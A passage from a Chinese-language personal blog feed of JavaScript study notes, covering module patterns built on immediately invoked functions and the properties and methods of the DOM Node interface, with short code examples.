<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> module1 = (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">　<span class="keyword">var</span> _count = <span class="number">0</span>;</span><br><span class="line">　<span class="keyword">var</span> m1 = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">　  <span class="comment">//...</span></span><br><span class="line">　&#125;;</span><br><span class="line">　<span class="keyword">var</span> m2 = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">　　<span class="comment">//...</span></span><br><span class="line">　&#125;;</span><br><span class="line">　<span class="keyword">return</span> &#123;</span><br><span class="line">　　m1 : m1,</span><br><span class="line">　　m2 : m2</span><br><span class="line">　&#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
<p>使用上面的写法，外部代码无法读取内部的<code>_count</code>变量。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.info(module1._count); <span class="comment">//undefined</span></span><br></pre></td></tr></table></figure>
<p>上面的<code>module1</code>就是 JavaScript 模块的基本写法。下面，再对这种写法进行加工。</p>
<h5 id="3-5-4-模块的放大模式"><a href="#3-5-4-模块的放大模式" class="headerlink" title="3.5.4 模块的放大模式"></a>3.5.4 模块的放大模式</h5><p>如果一个模块很大，必须分成几个部分，或者一个模块需要继承另一个模块，这时就有必要采用“放大模式”（augmentation）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> module1 = (<span class="function"><span class="keyword">function</span> (<span class="params">mod</span>)</span>&#123;</span><br><span class="line">　mod.m3 = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">　　<span class="comment">//...</span></span><br><span class="line">　&#125;;</span><br><span class="line">　<span class="keyword">return</span> mod;</span><br><span class="line">&#125;)(module1);</span><br></pre></td></tr></table></figure>
<p>上面的代码为<code>module1</code>模块添加了一个新方法<code>m3()</code>，然后返回新的<code>module1</code>模块。<br>在浏览器环境中，模块的各个部分通常都是从网上获取的，有时无法知道哪个部分会先加载。如果采用上面的写法，第一个执行的部分有可能加载一个不存在空对象，这时就要采用”宽放大模式”（Loose augmentation）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> module1 = (<span class="function"><span class="keyword">function</span> (<span class="params">mod</span>) </span>&#123;</span><br><span class="line">　<span class="comment">//...</span></span><br><span class="line">　<span class="keyword">return</span> mod;</span><br><span class="line">&#125;)(<span class="built_in">window</span>.module1 || &#123;&#125;);</span><br></pre></td></tr></table></figure>
<p>与”放大模式”相比，“宽放大模式”就是“立即执行函数”的参数可以是空对象。</p>
<h5 id="3-5-5-输入全局变量"><a href="#3-5-5-输入全局变量" class="headerlink" title="3.5.5 输入全局变量"></a>3.5.5 输入全局变量</h5><p>独立性是模块的重要特点，模块内部最好不与程序的其他部分直接交互。<br>为了在模块内部调用全局变量，必须显式地将其他变量输入模块。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> module1 = (<span class="function"><span class="keyword">function</span> (<span class="params">$, YAHOO</span>) </span>&#123;</span><br><span class="line">　<span class="comment">//...</span></span><br><span class="line">&#125;)(jQuery, YAHOO);</span><br></pre></td></tr></table></figure>
<p>上面的<code>module1</code>模块需要使用 jQuery 库和 YUI 库，就把这两个库（其实是两个模块）当作参数输入<code>module1</code>。这样做除了保证模块的独立性，还使得模块之间的依赖关系变得明显。</p>
<p>立即执行函数还可以起到命名空间的作用。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">$, <span class="built_in">window</span>, <span class="built_in">document</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">go</span>(<span class="params">num</span>) </span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">handleEvents</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">initialize</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">dieCarouselDie</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//attach to the global scope</span></span><br><span class="line">  <span class="built_in">window</span>.finalCarousel = &#123;</span><br><span class="line">    init : initialize,</span><br><span class="line">    destroy : dieCarouselDie</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;)( jQuery, <span class="built_in">window</span>, <span class="built_in">document</span> );</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>finalCarousel</code>对象输出到全局，对外暴露<code>init</code>和<code>destroy</code>接口，内部方法<code>go</code>、<code>handleEvents</code>、<code>initialize</code>、<code>dieCarouselDie</code>都是外部无法调用的。</p>
<p><code>Well,that&#39;s all for today</code></p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS面向对象编程-对象的继承</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0035</title>
    <url>/2021/05/22/%E6%89%93%E5%8D%A10035/</url>
    <content><![CDATA[<p><font color=#375830>恰沐春风共同游，终只叹，木已舟。</font></p>
<h2 id="JS-DOM"><a href="#JS-DOM" class="headerlink" title="JS DOM"></a>JS DOM</h2><h3 id="2-Node接口"><a href="#2-Node接口" class="headerlink" title="2. Node接口"></a>2. Node接口</h3><p>所有 DOM 节点对象都继承了 Node 接口，拥有一些共同的属性和方法。这是 DOM 操作的基础。</p>
<h4 id="2-1-属性"><a href="#2-1-属性" class="headerlink" title="2.1 属性"></a>2.1 属性</h4><h5 id="2-1-1-Node-prototype-nodeType"><a href="#2-1-1-Node-prototype-nodeType" class="headerlink" title="2.1.1 Node.prototype.nodeType"></a>2.1.1 Node.prototype.nodeType</h5><p><code>nodeType</code>属性返回一个整数值，表示节点的类型。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.nodeType <span class="comment">// 9</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，文档节点的类型值为9。</p>
<p>Node 对象定义了几个常量，对应这些类型值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.nodeType === Node.DOCUMENT_NODE <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，文档节点的<code>nodeType</code>属性等于常量<code>Node.DOCUMENT_NODE</code>。</p>
<p>不同节点的<code>nodeType</code>属性值和对应的常量如下。</p>
<ul>
<li>文档节点（document）：9，对应常量<code>Node.DOCUMENT_NODE</code></li>
<li>元素节点（element）：1，对应常量<code>Node.ELEMENT_NODE</code></li>
<li>属性节点（attr）：2，对应常量<code>Node.ATTRIBUTE_NODE</code></li>
<li>文本节点（text）：3，对应常量<code>Node.TEXT_NODE</code></li>
<li>文档片断节点（DocumentFragment）：11，对应常量<code>Node.DOCUMENT_FRAGMENT_NODE</code></li>
<li>文档类型节点（DocumentType）：10，对应常量<code>Node.DOCUMENT_TYPE_NODE</code></li>
<li>注释节点（Comment）：8，对应常量<code>Node.COMMENT_NODE</code><span id="more"></span>
确定节点类型时，使用<code>nodeType</code>属性是常用方法。<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> node = <span class="built_in">document</span>.documentElement.firstChild;</span><br><span class="line"><span class="keyword">if</span> (node.nodeType === Node.ELEMENT_NODE) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;该节点是元素节点&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="2-1-2-Node-prototype-nodeName"><a href="#2-1-2-Node-prototype-nodeName" class="headerlink" title="2.1.2 Node.prototype.nodeName"></a>2.1.2 Node.prototype.nodeName</h5><p><code>nodeName</code>属性返回节点的名称。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;d1&quot;&gt;hello world&lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;d1&#x27;</span>);</span><br><span class="line">div.nodeName <span class="comment">// &quot;DIV&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，元素节点<code>&lt;div&gt;</code>的<code>nodeName</code>属性就是大写的标签名<code>DIV</code>。</p>
<p>不同节点的<code>nodeName</code>属性值如下。</p>
<ul>
<li>文档节点（document）：<code>#document</code></li>
<li>元素节点（element）：大写的标签名</li>
<li>属性节点（attr）：属性的名称</li>
<li>文本节点（text）：<code>#text</code></li>
<li>文档片断节点（DocumentFragment）：<code>#document-fragment</code></li>
<li>文档类型节点（DocumentType）：文档的类型</li>
<li>注释节点（Comment）：<code>#comment</code></li>
</ul>
<h5 id="2-1-3-Node-prototype-nodeValue"><a href="#2-1-3-Node-prototype-nodeValue" class="headerlink" title="2.1.3 Node.prototype.nodeValue"></a>2.1.3 Node.prototype.nodeValue</h5><p><code>nodeValue</code>属性返回一个字符串，表示当前节点本身的文本值，该属性可读写。</p>
<p>只有文本节点（text）、注释节点（comment）和属性节点（attr）有文本值，因此这三类节点的<code>nodeValue</code>可以返回结果，其他类型的节点一律返回<code>null</code>。同样的，也只有这三类节点可以设置<code>nodeValue</code>属性的值，其他类型的节点设置无效。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;d1&quot;&gt;hello world&lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;d1&#x27;</span>);</span><br><span class="line">div.nodeValue <span class="comment">// null</span></span><br><span class="line">div.firstChild.nodeValue <span class="comment">// &quot;hello world&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>div</code>是元素节点，<code>nodeValue</code>属性返回<code>null</code>。<code>div.firstChild</code>是文本节点，所以可以返回文本值。</p>
<h5 id="2-1-4-Node-prototype-textContent"><a href="#2-1-4-Node-prototype-textContent" class="headerlink" title="2.1.4 Node.prototype.textContent"></a>2.1.4 Node.prototype.textContent</h5><p><code>textContent</code>属性返回当前节点和它的所有后代节点的文本内容。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;divA&quot;&gt;This is &lt;span&gt;some&lt;/span&gt; text&lt;/div&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&#x27;divA&#x27;</span>).textContent</span><br><span class="line"><span class="comment">// This is some text</span></span><br></pre></td></tr></table></figure>
<p><code>textContent</code>属性自动忽略当前节点内部的 HTML 标签，返回所有文本内容。</p>
<p>该属性是可读写的，设置该属性的值，会用一个新的文本节点，替换所有原来的子节点。它还有一个好处，就是自动对 HTML 标签转义。这很适合用于用户提供的内容。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&#x27;foo&#x27;</span>).textContent = <span class="string">&#x27;&lt;p&gt;GoodBye!&lt;/p&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>上面代码在插入文本时，会将<code>&lt;p&gt;</code>标签解释为文本，而不会当作标签处理。</p>
<p>对于文本节点（text）、注释节点（comment）和属性节点（attr），<code>textContent</code>属性的值与<code>nodeValue</code>属性相同。对于其他类型的节点，该属性会将每个子节点（不包括注释节点）的内容连接在一起返回。如果一个节点没有子节点，则返回空字符串。</p>
<p>文档节点（document）和文档类型节点（doctype）的<code>textContent</code>属性为<code>null</code>。如果要读取整个文档的内容，可以使用<code>document.documentElement.textContent</code>。</p>
<h5 id="2-1-5-Node-prototype-baseURI"><a href="#2-1-5-Node-prototype-baseURI" class="headerlink" title="2.1.5 Node.prototype.baseURI"></a>2.1.5 Node.prototype.baseURI</h5><p><code>baseURI</code>属性返回一个字符串，表示当前网页的绝对路径。浏览器根据这个属性，计算网页上的相对路径的 URL。该属性为只读。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 当前网页的网址为</span></span><br><span class="line"><span class="comment">// http://www.example.com/index.html</span></span><br><span class="line"><span class="built_in">document</span>.baseURI</span><br><span class="line"><span class="comment">// &quot;http://www.example.com/index.html&quot;</span></span><br></pre></td></tr></table></figure>
<p>如果无法读到网页的 URL，<code>baseURI</code>属性返回<code>null</code>。</p>
<p>该属性的值一般由当前网址的 URL（即<code>window.location</code>属性）决定，但是可以使用 HTML 的<code>&lt;base&gt;</code>标签，改变该属性的值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;base href=<span class="string">&quot;http://www.example.com/page.html&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<p>设置了以后，<code>baseURI</code>属性就返回<code>&lt;base&gt;</code>标签设置的值。</p>
<h5 id="2-1-6-Node-prototype-ownerDocument"><a href="#2-1-6-Node-prototype-ownerDocument" class="headerlink" title="2.1.6 Node.prototype.ownerDocument"></a>2.1.6 Node.prototype.ownerDocument</h5><p><code>Node.ownerDocument</code>属性返回当前节点所在的顶层文档对象，即<code>document</code>对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> d = p.ownerDocument;</span><br><span class="line">d === <span class="built_in">document</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p><code>document</code>对象本身的<code>ownerDocument</code>属性，返回<code>null</code>。</p>
<h5 id="2-1-7-Node-prototype-nextSibling"><a href="#2-1-7-Node-prototype-nextSibling" class="headerlink" title="2.1.7 Node.prototype.nextSibling"></a>2.1.7 Node.prototype.nextSibling</h5><p><code>Node.nextSibling</code>属性返回紧跟在当前节点后面的第一个同级节点。如果当前节点后面没有同级节点，则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;d1&quot;&gt;hello&lt;/div&gt;&lt;div id=&quot;d2&quot;&gt;world&lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> d1 = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;d1&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> d2 = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;d2&#x27;</span>);</span><br><span class="line"></span><br><span class="line">d1.nextSibling === d2 <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>d1.nextSibling</code>就是紧跟在<code>d1</code>后面的同级节点<code>d2</code>。</p>
<p>注意，该属性还包括文本节点和注释节点（<code>&lt;!-- comment --&gt;</code>）。因此如果当前节点后面有空格，该属性会返回一个文本节点，内容为空格。</p>
<p><code>nextSibling</code>属性可以用来遍历所有子节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> el = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;div1&#x27;</span>).firstChild;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (el !== <span class="literal">null</span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(el.nodeName);</span><br><span class="line">  el = el.nextSibling;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码遍历<code>div1</code>节点的所有子节点。</p>
<h5 id="2-1-8-Node-prototype-previousSibling"><a href="#2-1-8-Node-prototype-previousSibling" class="headerlink" title="2.1.8 Node.prototype.previousSibling"></a>2.1.8 Node.prototype.previousSibling</h5><p><code>previousSibling</code>属性返回当前节点前面的、距离最近的一个同级节点。如果当前节点前面没有同级节点，则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;d1&quot;&gt;hello&lt;/div&gt;&lt;div id=&quot;d2&quot;&gt;world&lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> d1 = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;d1&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> d2 = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;d2&#x27;</span>);</span><br><span class="line"></span><br><span class="line">d2.previousSibling === d1 <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>d2.previousSibling</code>就是<code>d2</code>前面的同级节点<code>d1</code>。</p>
<p>注意，该属性还包括文本节点和注释节点。因此如果当前节点前面有空格，该属性会返回一个文本节点，内容为空格。</p>
<h5 id="2-1-9-Node-prototype-parentNode"><a href="#2-1-9-Node-prototype-parentNode" class="headerlink" title="2.1.9 Node.prototype.parentNode"></a>2.1.9 Node.prototype.parentNode</h5><p><code>parentNode</code>属性返回当前节点的父节点。对于一个节点来说，它的父节点只可能是三种类型：元素节点（element）、文档节点（document）和文档片段节点（documentfragment）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (node.parentNode) &#123;</span><br><span class="line">  node.parentNode.removeChild(node);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，通过<code>node.parentNode</code>属性将<code>node</code>节点从文档里面移除。</p>
<p>文档节点（document）和文档片段节点（documentfragment）的父节点都是<code>null</code>。另外，对于那些生成后还没插入 DOM 树的节点，父节点也是<code>null</code>。</p>
<h5 id="2-1-10-Node-prototype-parentElement"><a href="#2-1-10-Node-prototype-parentElement" class="headerlink" title="2.1.10 Node.prototype.parentElement"></a>2.1.10 Node.prototype.parentElement</h5><p><code>parentElement</code>属性返回当前节点的父元素节点。如果当前节点没有父节点，或者父节点类型不是元素节点，则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (node.parentElement) &#123;</span><br><span class="line">  node.parentElement.style.color = <span class="string">&#x27;red&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，父元素节点的样式设定了红色。</p>
<p>由于父节点只可能是三种类型：元素节点、文档节点（document）和文档片段节点（documentfragment）。<code>parentElement</code>属性相当于把后两种父节点都排除了。</p>
<h5 id="2-1-11-Node-prototype-firstChild，Node-prototype-lastChild"><a href="#2-1-11-Node-prototype-firstChild，Node-prototype-lastChild" class="headerlink" title="2.1.11 Node.prototype.firstChild，Node.prototype.lastChild"></a>2.1.11 Node.prototype.firstChild，Node.prototype.lastChild</h5><p><code>firstChild</code>属性返回当前节点的第一个子节点，如果当前节点没有子节点，则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;p id=&quot;p1&quot;&gt;&lt;span&gt;First span&lt;/span&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="keyword">var</span> p1 = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;p1&#x27;</span>);</span><br><span class="line">p1.firstChild.nodeName <span class="comment">// &quot;SPAN&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>p</code>元素的第一个子节点是<code>span</code>元素。</p>
<p>注意，<code>firstChild</code>返回的除了元素节点，还可能是文本节点或注释节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;p id=&quot;p1&quot;&gt;</span></span><br><span class="line"><span class="comment">//   &lt;span&gt;First span&lt;/span&gt;</span></span><br><span class="line"><span class="comment">//  &lt;/p&gt;</span></span><br><span class="line"><span class="keyword">var</span> p1 = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;p1&#x27;</span>);</span><br><span class="line">p1.firstChild.nodeName <span class="comment">// &quot;#text&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>p</code>元素与<code>span</code>元素之间有空白字符，这导致<code>firstChild</code>返回的是文本节点。</p>
<p><code>lastChild</code>属性返回当前节点的最后一个子节点，如果当前节点没有子节点，则返回<code>null</code>。用法与<code>firstChild</code>属性相同。</p>
<h5 id="2-1-12-Node-prototype-childNodes"><a href="#2-1-12-Node-prototype-childNodes" class="headerlink" title="2.1.12 Node.prototype.childNodes"></a>2.1.12 Node.prototype.childNodes</h5><p><code>childNodes</code>属性返回一个类似数组的对象（<code>NodeList</code>集合），成员包括当前节点的所有子节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> children = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;ul&#x27;</span>).childNodes;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>children</code>就是<code>ul</code>元素的所有子节点。</p>
<p>使用该属性，可以遍历某个节点的所有子节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;div1&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> children = div.childNodes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; children.length; i++) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>文档节点（document）就有两个子节点：文档类型节点（docType）和 HTML 根元素节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> children = <span class="built_in">document</span>.childNodes;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; children.length; i++) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(children[i].nodeType);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 10</span></span><br><span class="line"><span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，文档节点的第一个子节点的类型是10（即文档类型节点），第二个子节点的类型是1（即元素节点）。</p>
<p>注意，除了元素节点，<code>childNodes</code>属性的返回值还包括文本节点和注释节点。如果当前节点不包括任何子节点，则返回一个空的<code>NodeList</code>集合。由于<code>NodeList</code>对象是一个动态集合，一旦子节点发生变化，立刻会反映在返回结果之中。</p>
<h5 id="2-1-13-Node-prototype-isConnected"><a href="#2-1-13-Node-prototype-isConnected" class="headerlink" title="2.1.13 Node.prototype.isConnected"></a>2.1.13 Node.prototype.isConnected</h5><p><code>isConnected</code>属性返回一个布尔值，表示当前节点是否在文档之中。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> test = <span class="built_in">document</span>.createElement(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">test.isConnected <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.body.appendChild(test);</span><br><span class="line">test.isConnected <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>test</code>节点是脚本生成的节点，没有插入文档之前，<code>isConnected</code>属性返回<code>false</code>，插入之后返回<code>true</code>。</p>
<h4 id="2-2-方法"><a href="#2-2-方法" class="headerlink" title="2.2 方法"></a>2.2 方法</h4><h5 id="2-2-1-Node-prototype-appendChild"><a href="#2-2-1-Node-prototype-appendChild" class="headerlink" title="2.2.1 Node.prototype.appendChild()"></a>2.2.1 Node.prototype.appendChild()</h5><p><code>appendChild()</code>方法接受一个节点对象作为参数，将其作为最后一个子节点，插入当前节点。该方法的返回值就是插入文档的子节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="built_in">document</span>.createElement(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(p);</span><br></pre></td></tr></table></figure>
<p>上面代码新建一个<code>&lt;p&gt;</code>节点，将其插入<code>document.body</code>的尾部。</p>
<p>如果参数节点是 DOM 已经存在的节点，<code>appendChild()</code>方法会将其从原来的位置，移动到新位置。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;myDiv&#x27;</span>);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(div);</span><br></pre></td></tr></table></figure>
<p>上面代码中，插入的是一个已经存在的节点<code>myDiv</code>，结果就是该节点会从原来的位置，移动到<code>document.body</code>的尾部。</p>
<p>如果<code>appendChild()</code>方法的参数是<code>DocumentFragment</code>节点，那么插入的是<code>DocumentFragment</code>的所有子节点，而不是<code>DocumentFragment</code>节点本身。返回值是一个空的<code>DocumentFragment</code>节点。</p>
<h5 id="2-2-2-Node-prototype-hasChildNodes"><a href="#2-2-2-Node-prototype-hasChildNodes" class="headerlink" title="2.2.2 Node.prototype.hasChildNodes()"></a>2.2.2 Node.prototype.hasChildNodes()</h5><p><code>hasChildNodes</code>方法返回一个布尔值，表示当前节点是否有子节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (foo.hasChildNodes()) &#123;</span><br><span class="line">  foo.removeChild(foo.childNodes[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码表示，如果<code>foo</code>节点有子节点，就移除第一个子节点。</p>
<p>注意，子节点包括所有类型的节点，并不仅仅是元素节点。哪怕节点只包含一个空格，<code>hasChildNodes</code>方法也会返回<code>true</code>。</p>
<p>判断一个节点有没有子节点，有许多种方法，下面是其中的三种。</p>
<ul>
<li><code>node.hasChildNodes()</code></li>
<li><code>node.firstChild !== null</code></li>
<li><code>node.childNodes &amp;&amp; node.childNodes.length &gt; 0</code></li>
</ul>
<p><code>hasChildNodes</code>方法结合<code>firstChild</code>属性和<code>nextSibling</code>属性，可以遍历当前节点的所有后代节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DOMComb</span>(<span class="params">parent, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (parent.hasChildNodes()) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> node = parent.firstChild; node; node = node.nextSibling) &#123;</span><br><span class="line">      DOMComb(node, callback);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  callback(parent);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用法</span></span><br><span class="line">DOMComb(<span class="built_in">document</span>.body, <span class="built_in">console</span>.log)</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>DOMComb</code>函数的第一个参数是某个指定的节点，第二个参数是回调函数。这个回调函数会依次作用于指定节点，以及指定节点的所有后代节点。</p>
<h5 id="2-2-3-Node-prototype-cloneNode"><a href="#2-2-3-Node-prototype-cloneNode" class="headerlink" title="2.2.3 Node.prototype.cloneNode()"></a>2.2.3 Node.prototype.cloneNode()</h5><p><code>cloneNode</code>方法用于克隆一个节点。它接受一个布尔值作为参数，表示是否同时克隆子节点。它的返回值是一个克隆出来的新节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> cloneUL = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;ul&#x27;</span>).cloneNode(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
<p>该方法有一些使用注意点。</p>
<p>（1）克隆一个节点，会拷贝该节点的所有属性，但是会丧失<code>addEventListener</code>方法和<code>on-</code>属性（即<code>node.onclick = fn</code>），添加在这个节点上的事件回调函数。</p>
<p>（2）该方法返回的节点不在文档之中，即没有任何父节点，必须使用诸如<code>Node.appendChild</code>这样的方法添加到文档之中。</p>
<p>（3）克隆一个节点之后，DOM 有可能出现两个有相同<code>id</code>属性（即<code>id=&quot;xxx&quot;</code>）的网页元素，这时应该修改其中一个元素的<code>id</code>属性。如果原节点有<code>name</code>属性，可能也需要修改。</p>
<h5 id="2-2-4-Node-prototype-insertBefore"><a href="#2-2-4-Node-prototype-insertBefore" class="headerlink" title="2.2.4 Node.prototype.insertBefore()"></a>2.2.4 Node.prototype.insertBefore()</h5><p><code>insertBefore</code>方法用于将某个节点插入父节点内部的指定位置。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> insertedNode = parentNode.insertBefore(newNode, referenceNode);</span><br></pre></td></tr></table></figure>
<p><code>insertBefore</code>方法接受两个参数，第一个参数是所要插入的节点<code>newNode</code>，第二个参数是父节点<code>parentNode</code>内部的一个子节点<code>referenceNode</code>。<code>newNode</code>将插在<code>referenceNode</code>这个子节点的前面。返回值是插入的新节点<code>newNode</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="built_in">document</span>.createElement(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"><span class="built_in">document</span>.body.insertBefore(p, <span class="built_in">document</span>.body.firstChild);</span><br></pre></td></tr></table></figure>
<p>上面代码中，新建一个<code>&lt;p&gt;</code>节点，插在<code>document.body.firstChild</code>的前面，也就是成为<code>document.body</code>的第一个子节点。</p>
<p>如果<code>insertBefore</code>方法的第二个参数为<code>null</code>，则新节点将插在当前节点内部的最后位置，即变成最后一个子节点。</p>
